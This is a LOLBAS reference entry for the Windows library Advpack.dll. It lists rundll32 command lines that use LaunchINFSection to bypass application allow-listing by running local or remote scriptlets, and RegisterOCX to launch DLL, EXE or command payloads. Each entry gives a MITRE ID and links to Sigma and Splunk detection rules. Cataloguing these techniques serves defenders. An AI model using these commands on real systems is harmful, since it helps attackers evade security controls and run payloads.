---
Acknowledgement:
- Handle: '@bohops'
  Person: Jimmy (LaunchINFSection)
- Handle: '@0rbz_'
  Person: Fabrizio (RegisterOCX - DLL)
- Handle: '@moriarty_meng'
  Person: Moriarty (RegisterOCX - CMD)
- Person: Nick Carr (Threat Int
Author: LOLBAS Team
Code_Sample:
- Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack.inf
- Code: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack_calc.sct
Commands:
- Category: AWL Bypass
  Command: rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
  Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll
    in the .inf file by calling an information file directive (section name specified).
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: INF
  Usecase: Run local or remote script(let) code through INF file specification.
- Category: AWL Bypass
  Command: rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
  Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll
    in the .inf file by calling an information file directive (DefaultInstall section
    implied).
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: INF
  Usecase: Run local or remote script(let) code through INF file specification.
- Category: Execute
  Command: rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
  Description: Launch a DLL payload by calling the RegisterOCX function.
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL
  Usecase: Load a DLL payload.
- Category: Execute
  Command: rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
  Description: Launch an executable by calling the RegisterOCX function.
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Run an executable payload.
- Category: Execute
  Command: rundll32 advpack.dll, RegisterOCX {CMD}
  Description: Launch command line by calling the RegisterOCX function.
  MitreID: T1218.011
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Run an executable payload.
Created: 2018-05-25
Description: Utility for installing software and drivers with rundll32.exe
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml
Full_Path:
- Path: c:\windows\system32\advpack.dll
- Path: c:\windows\syswow64\advpack.dll
Name: Advpack.dll
Resources:
- Link: https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
- Link: https://twitter.com/ItsReallyNick/status/967859147977850880
- Link: https://twitter.com/bohops/status/974497123101179904
- Link: https://twitter.com/moriarty_meng/status/977848311603380224
mitre_data:
  technique_ids:
  - T1218.011
tags:
- lolbas/oslibraries
---

# Advpack.dll

Utility for installing software and drivers with rundll32.exe

# Path(s)

- `c:\windows\system32\advpack.dll`
- `c:\windows\syswow64\advpack.dll`

# AWL Bypass Commands

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

```batch
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
```

- **Usecase:** Run local or remote script(let) code through INF file specification.
- **Privileges Required:** User
- **MitreID:** `T1218.011`
- **Operating System(s):** Windows 10, Windows 11



Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

```batch
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
```

- **Usecase:** Run local or remote script(let) code through INF file specification.
- **Privileges Required:** User
- **MitreID:** `T1218.011`
- **Operating System(s):** Windows 10, Windows 11



# Execute Commands

Launch a DLL payload by calling the RegisterOCX function.

```batch
rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
```

- **Usecase:** Load a DLL payload.
- **Privileges Required:** User
- **MitreID:** `T1218.011`
- **Operating System(s):** Windows 10, Windows 11



Launch an executable by calling the RegisterOCX function.

```batch
rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
```

- **Usecase:** Run an executable payload.
- **Privileges Required:** User
- **MitreID:** `T1218.011`
- **Operating System(s):** Windows 10, Windows 11



Launch command line by calling the RegisterOCX function.

```batch
rundll32 advpack.dll, RegisterOCX {CMD}
```

- **Usecase:** Run an executable payload.
- **Privileges Required:** User
- **MitreID:** `T1218.011`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
- https://twitter.com/ItsReallyNick/status/967859147977850880
- https://twitter.com/bohops/status/974497123101179904
- https://twitter.com/moriarty_meng/status/977848311603380224
# Acknowledgements

- LOLBAS Team (Authored, 2018-05-25)
- Jimmy (LaunchINFSection) (@bohops)
- Fabrizio (RegisterOCX - DLL) (@0rbz_)
- Moriarty (RegisterOCX - CMD) (@moriarty_meng)
- Nick Carr (Threat Int